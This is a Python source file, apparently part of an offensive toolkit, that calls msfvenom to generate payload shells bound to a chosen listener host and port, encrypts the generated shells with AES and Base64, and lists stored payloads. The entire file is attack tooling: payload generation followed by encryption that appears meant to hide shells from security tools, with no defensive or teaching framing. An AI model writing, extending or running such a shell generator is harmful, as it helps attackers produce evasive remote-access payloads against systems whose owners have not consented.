import os
import subprocess
from modules.encryption_utils import encrypt_shell, generate_aes_key

SHELLS_DIR = "generated_shells"
PAYLOADS_DIR = "payloads"

if not os.path.exists(SHELLS_DIR):
    os.makedirs(SHELLS_DIR)
    print(f"[INFO] Created directory for shells: {SHELLS_DIR}")

if not os.path.exists(PAYLOADS_DIR):
    os.makedirs(PAYLOADS_DIR)
    print(f"[INFO] Created directory for payloads: {PAYLOADS_DIR}")

# Function: Generate Shell
def generate_msfvenom_shell(payload, lhost, lport, output_format, output_name):
    output_path = os.path.join(SHELLS_DIR, output_name)
    try:
        print(f"[INFO] Generating shell with payload: {payload}")
        command = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", output_format,
            "-o", output_path,
        ]
        subprocess.run(command, check=True)
        print(f"[SUCCESS] Shell generated: {output_path}")
        return output_path
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to generate shell: {e}")
        return None

# Function: Encrypt Shell (AES + Base64)
def encrypt_generated_shell(shell_path):
    """
    Encrypt a generated shell using AES + Base64.

    :param shell_path: Path to the shell file to encrypt.
    """
    if not os.path.exists(shell_path):
        print(f"[ERROR] Shell file not found: {shell_path}")
        return None

    print("[INFO] Generating AES key for shell encryption...")
    aes_key = generate_aes_key()
    encrypt_shell(shell_path, aes_key)

# Function: List Payloads
def list_payloads():
    """
    List all payloads available in the payloads directory.
    """
    try:
        files = [f for f in os.listdir(PAYLOADS_DIR) if os.path.isfile(os.path.join(PAYLOADS_DIR, f))]
        if not files:
            print("[INFO] No payloads found in the payloads directory.")
            return []
        
        print("\n[ Available Payloads ]")
        for idx, file_name in enumerate(files, 1):
            print(f"{idx}.) {file_name}")
        return files
    except Exception as e:
        print(f"[ERROR] Failed to list payloads: {e}")
        return []
